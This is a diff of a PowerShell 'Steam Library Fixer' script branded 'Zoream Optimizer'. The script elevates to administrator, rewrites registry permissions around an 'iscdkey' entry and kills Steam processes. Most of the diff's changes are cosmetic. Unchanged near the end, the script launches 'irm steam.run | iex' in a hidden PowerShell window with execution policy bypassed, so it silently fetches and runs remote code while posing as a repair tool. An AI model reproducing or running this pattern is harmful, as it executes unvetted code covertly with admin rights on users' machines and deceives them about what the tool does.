@@ -1,3 +1,4 @@
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 Try {
     $MethodDefinition = @'
     [DllImport("kernel32.dll")]
@@ -8,7 +9,8 @@ Try {
     public static extern IntPtr GetStdHandle(int nStdHandle);
 '@
     $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru
-} catch {}
+}
+catch {}
 
 function Disable-QuickEdit {
     $hInput = $Kernel32::GetStdHandle(-10) 
@@ -25,9 +27,9 @@ $host.UI.RawUI.ForegroundColor = "White"
 $host.UI.RawUI.WindowTitle = "Zoream Optimizer | SYS_0xA7"
 Clear-Host
 
-$identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
+$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
 $principal = New-Object Security.Principal.WindowsPrincipal($identity)
-$isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
     Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
@@ -44,12 +46,12 @@ Disable-QuickEdit
 
 function Show-Header {
     Write-Host " "
-    Write-Host "   ███████╗ ██████╗ ██████╗ ███████╗ █████╗ ███╗   ███╗" -ForegroundColor Cyan
-    Write-Host "   ╚══███╔╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗████╗ ████║" -ForegroundColor Cyan
-    Write-Host "     ███╔╝ ██║   ██║██████╔╝█████╗  ███████║██╔████╔██║" -ForegroundColor DarkCyan
-    Write-Host "    ███╔╝  ██║   ██║██╔══██╗██╔══╝  ██╔══██║██║╚██╔╝██║" -ForegroundColor Blue
-    Write-Host "   ███████╗╚██████╔╝██║  ██║███████╗██║  ██║██║ ╚═╝ ██║" -ForegroundColor Blue
-    Write-Host "   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝" -ForegroundColor DarkBlue
+    Write-Host "  ______                                              " -ForegroundColor Cyan
+    Write-Host " |__  /   ___   _ __    ___    __ _   _ __ ___        " -ForegroundColor Cyan
+    Write-Host "   / /   / _ \ | '__|  / _ \  / _`` | | '_ `` _ \       " -ForegroundColor DarkCyan
+    Write-Host "  / /_  | (_) || |    |  __/ | (_| | | | | | | |      " -ForegroundColor Blue
+    Write-Host " /____|  \___/ |_|     \___|  \__,_| |_| |_| |_|      " -ForegroundColor Blue
+    Write-Host " "
     Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
     Write-Host "          Steam Library Fixer BY SYS_0xA7 " -ForegroundColor White
     Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
@@ -60,11 +62,11 @@ function Write-Log {
     param([string]$Message, [string]$Type = "INFO")
     $Time = Get-Date -Format "HH:mm:ss"
     switch ($Type) {
-        "INFO"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [?] $Message" -ForegroundColor Gray }
+        "INFO" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [?] $Message" -ForegroundColor Gray }
         "SUCCESS" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [OK] $Message" -ForegroundColor Green }
-        "WARN"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [!] $Message" -ForegroundColor Yellow }
-        "ERROR"   { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [X] $Message" -ForegroundColor Red }
-        "STEP"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [>] $Message" -ForegroundColor Cyan }
+        "WARN" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [!] $Message" -ForegroundColor Yellow }
+        "ERROR" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [X] $Message" -ForegroundColor Red }
+        "STEP" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [>] $Message" -ForegroundColor Cyan }
     }
 }
 
@@ -188,7 +190,7 @@ try {
 
     # 2. SID Tanımları
     $adminSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544") # Administrators
-    $userSID  = [System.Security.Principal.WindowsIdentity]::GetCurrent().User            # Mevcut Kullanıcı
+    $userSID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User            # Mevcut Kullanıcı
 
     # 3. ACL'yi baştan tertemiz yarat (Eski tüm bozuk izinleri çöpe atar)
     $acl = New-Object System.Security.AccessControl.RegistrySecurity
@@ -203,11 +205,11 @@ try {
     $rights = [System.Security.AccessControl.RegistryRights]::FullControl
     $iFlags = [System.Security.AccessControl.InheritanceFlags]"ContainerInherit, ObjectInherit"
     $pFlags = [System.Security.AccessControl.PropagationFlags]::None
-    $type   = [System.Security.AccessControl.AccessControlType]::Allow
+    $type = [System.Security.AccessControl.AccessControlType]::Allow
 
     # 7. Kuralları teker teker ACL'ye zorla işlet (ResetAccessRule yerine Add kullanıyoruz)
     $adminRule = New-Object System.Security.AccessControl.RegistryAccessRule($adminSID, $rights, $iFlags, $pFlags, $type)
-    $userRule  = New-Object System.Security.AccessControl.RegistryAccessRule($userSID, $rights, $iFlags, $pFlags, $type)
+    $userRule = New-Object System.Security.AccessControl.RegistryAccessRule($userSID, $rights, $iFlags, $pFlags, $type)
     
     $acl.AddAccessRule($adminRule)
     $acl.AddAccessRule($userRule)
@@ -223,12 +225,13 @@ try {
         Write-Log "Registry 'iscdkey' setup complete and verified." "SUCCESS"
     }
 
-} catch {
+}
+catch {
     Write-Log "Registry Force Error: $_" "ERROR"
 }
 # -------------------------------------------------------------------------
 
-Write-Log "Clearing Beta & Killing Processes..." "STEP"
+Write-Log "Clearing Beta and Killing Processes..." "STEP"
 Start-Process (Join-Path $steamPath "Steam.exe") -ArgumentList "-clearbeta"
 Start-Sleep -Seconds 5
 Get-Process steam* -ErrorAction SilentlyContinue | Stop-Process -Force
@@ -325,16 +328,16 @@ foreach ($cfg in $cfgFiles) {
     }
 }
 
-Write-Log "Fix & Cleanup complete." "SUCCESS"
+Write-Log "Fix and Cleanup complete." "SUCCESS"
 Write-Host " "
-Write-Host "   >>> CORE EXECUTING IN BACKGROUND <<<" -ForegroundColor Cyan
+Write-Host "   *** CORE EXECUTING IN BACKGROUND ***" -ForegroundColor Cyan
 Write-Host " "
 
 $command = "irm steam.run | iex"
 Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden
 
 for ($i = 10; $i -gt 0; $i--) {
-    Write-Host "`r   >>> This window will close in $i second(s) <<<  " -ForegroundColor Magenta -NoNewline
+    Write-Host "`r   *** This window will close in $i second(s) ***  " -ForegroundColor Magenta -NoNewline
     Start-Sleep -Seconds 1
 }
 
